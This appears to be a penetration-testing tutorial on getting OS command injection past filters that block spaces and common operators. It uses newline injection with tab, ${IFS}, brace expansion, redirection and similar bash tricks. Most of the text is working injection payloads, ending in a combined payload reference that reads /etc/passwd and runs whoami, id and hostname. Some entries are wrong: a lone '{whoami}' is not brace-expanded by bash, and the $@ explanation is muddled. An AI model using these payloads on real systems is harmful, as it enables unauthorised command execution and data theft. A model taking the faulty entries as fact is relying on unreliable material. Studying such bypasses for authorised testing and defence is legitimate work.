## Bypassing Space Filters

Space characters are one of the most commonly blacklisted inputs on forms that expect structured data like IP addresses. Since a valid IP address never contains a space, any space in the input is a strong signal of an injection attempt. However, the shell has no strict requirement that arguments be separated by literal space characters, and several substitutes achieve the same result.

***

## Step 1: Find a Working Operator First

Before tackling space bypasses, confirm which injection operator works. As covered previously, the newline character (`%0a`) is frequently missed by blacklists because developers focus on operators like `;`, `&&`, and `|` while overlooking newlines. Test it first:

```
127.0.0.1%0awhoami
```

If this returns ping output followed by the whoami result, newline is your working operator. The space bypass techniques below all build on top of this.

***

## Space Bypass Techniques

### 1. Tab Character (%09)

Both Linux and Windows shells accept tab characters as argument separators, identical in function to a space. Since tab is rarely added to blacklists:

```bash
# Original (blocked):  127.0.0.1%0a whoami
# Tab bypass:          127.0.0.1%0a%09whoami

# Shell interprets as:
ping -c 1 127.0.0.1
[TAB]whoami
```

URL-encoded tab is `%09`. In Burp, simply replace any space in your payload with `%09`.

### 2. $IFS Environment Variable

`$IFS` (Internal Field Separator) is a built-in bash variable whose default value is a space, tab, and newline. The shell expands it before execution, meaning `${IFS}` in a command string becomes a space character at parse time:

```bash
# IFS bypass:
127.0.0.1%0a${IFS}whoami

# Shell expands to:
ping -c 1 127.0.0.1
whoami

# Works between arguments too:
cat${IFS}/etc/passwd
ls${IFS}-la${IFS}/var/www/html
```

`${IFS}` is particularly reliable because it is a language feature of bash itself rather than a character, so character-level blacklists have no way to block it without also blocking `$` entirely, which would break many other legitimate operations.

### 3. Brace Expansion

Bash brace expansion generates argument lists and automatically inserts spaces during expansion. The syntax `{command,arg}` expands to `command arg` with a space, before the shell processes the command:

```bash
# Brace expansion bypass:
{ls,-la}          # expands to: ls -la
{cat,/etc/passwd} # expands to: cat /etc/passwd
{whoami}          # expands to: whoami

# In a full injection payload:
127.0.0.1%0a{ls,-la}
127.0.0.1%0a{cat,/etc/passwd}
```

This is the cleanest bypass when you need to pass flags to commands, since `{command,-flag,argument}` expands to `command -flag argument` with proper spacing throughout.

### 4. Input Redirection

The `<` redirection operator passes file content to a command. For commands that read from stdin, this eliminates spaces entirely:

```bash
cat</etc/passwd
# Equivalent to: cat /etc/passwd

# In injection:
127.0.0.1%0acat</etc/passwd
```

### 5. Variable Substring Trick

Bash variable slicing can extract the space character from existing environment variables without writing a literal space:

```bash
# $PATH typically starts with /usr/local/...
# Extract position that contains a known character
echo ${PATH:0:1}   # outputs /
echo ${HOME}       # outputs /root or /home/user

# IFS trick via variable manipulation
X=$'\x20'&&cat${X}/etc/passwd
```

### 6. Positional Parameter `$@`

In bash, `$@` expands to nothing when there are no positional parameters, but acts as a separator between adjacent strings, which the shell then concatenates into a single command:

```bash
who$@ami    # expands to: whoami (the $@ is empty, strings join)
```

This is more useful for command name obfuscation than space bypassing, but it demonstrates the depth of bash expansion mechanisms available.

***

## Combined Payload Reference

Putting operator bypass and space bypass together for a full working payload against a filter that blocks `;`, `&&`, `|`, and space:

```bash
# Newline operator + tab space
127.0.0.1%0a%09whoami

# Newline operator + IFS
127.0.0.1%0a${IFS}whoami

# Newline operator + brace expansion (no space needed at all)
127.0.0.1%0a{whoami}

# Reading /etc/passwd with no spaces at all
127.0.0.1%0acat</etc/passwd

# Multi-command with no spaces
127.0.0.1%0a{cat,/etc/passwd}%0a{id}%0a{hostname}
```

***

## Space Bypass Quick Reference

| Technique | Syntax | Works On |
|-----------|--------|----------|
| Tab character | `%09` | Linux, Windows |
| IFS variable | `${IFS}` | Linux (bash) |
| Brace expansion | `{cmd,arg}` | Linux (bash) |
| Input redirection | `cmd</path` | Linux |
| `$@` separator | `wh$@oami` | Linux (bash) |
| `{cmd}` alone | `{whoami}` | Linux (bash) |
| `$'\x20'` ANSI-C quoting | `X=$'\x20'&&cmd${X}arg` | Linux (bash) |

The underlying principle across all of these is that the shell's expansion and parsing phase happens after the blacklist check. The application sees the raw string and finds no space character. The shell receives that same string and expands it into a properly spaced command before execution ever begins. Any filter that operates on the raw string before shell expansion will be bypassed by anything the shell expands at parse time.
